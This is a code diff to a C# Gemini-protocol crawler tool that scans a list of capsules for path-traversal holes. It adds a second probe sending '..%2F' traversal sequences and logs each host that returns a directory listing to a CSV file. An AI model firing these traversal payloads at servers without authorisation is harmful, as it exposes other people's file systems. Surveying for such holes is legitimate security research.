@@ -16,9 +16,9 @@ namespace Kennedy.Crawler.Support
             ThreadSafeCounter counter = new ThreadSafeCounter();
             ThreadSafeCounter found = new ThreadSafeCounter();
 
-            ThreadedFileWriter logOut = new ThreadedFileWriter($"{Crawler.DataDirectory}/vuln.csv", 1);
+            ThreadedFileWriter logOut = new ThreadedFileWriter($"{Crawler.DataDirectory}/all-vulns.csv", 1);
 
-            string[] hosts = File.ReadAllLines($"{Crawler.DataDirectory}caps.txt");
+            string[] hosts = File.ReadAllLines($"{Crawler.DataDirectory}capsules-to-scan.txt");
 
             int total = hosts.Length;
 
@@ -27,10 +27,31 @@ namespace Kennedy.Crawler.Support
             Parallel.ForEach(hosts, new ParallelOptions { MaxDegreeOfParallelism = parallelThreadsCount }, host =>
             {
                 int t = counter.Increment();
-                if(IsVuln(host))
+
+                bool variant1 = IsVuln1(host);
+                bool variant2 = IsVuln2(host);
+
+                if (variant1 || variant2)
                 {
+
+                    var line = $"{host},";
+                    if(variant1)
+                    {
+                        line += $"\"gemini://{host}/%2F/\",";
+                    } else
+                    {
+                        line += "-,";
+                    }
+
+                    if (variant2)
+                    {
+                        line += $"\"gemini://{host}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F/\",";
+                    }
+                    else
+                    {
+                        line += "-,";
+                    }
                     found.Increment();
-                    var line = $"{host}, gemini://{host}/%2F/, vulnerable!";
                     Console.WriteLine(line);
                     logOut.WriteLine(line);
                 }
@@ -42,7 +63,7 @@ namespace Kennedy.Crawler.Support
 
         }
 
-        private static bool IsVuln(string host)
+        private static bool IsVuln1(string host)
         {
             GeminiRequestor gemiRequestor = new GeminiRequestor();
 
@@ -55,5 +76,20 @@ namespace Kennedy.Crawler.Support
             }
             return false;
         }
+
+        private static bool IsVuln2(string host)
+        {
+            GeminiRequestor gemiRequestor = new GeminiRequestor();
+
+            var fullUrl = $"gemini://{host}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F/";
+
+            var resp = gemiRequestor.Request(fullUrl);
+            if (gemiRequestor.LastException == null && resp.IsSuccess && resp.IsTextResponse && resp.BodyText.Contains("Directory Listing"))
+            {
+                return true;
+            }
+            return false;
+        }
+
     }
 }
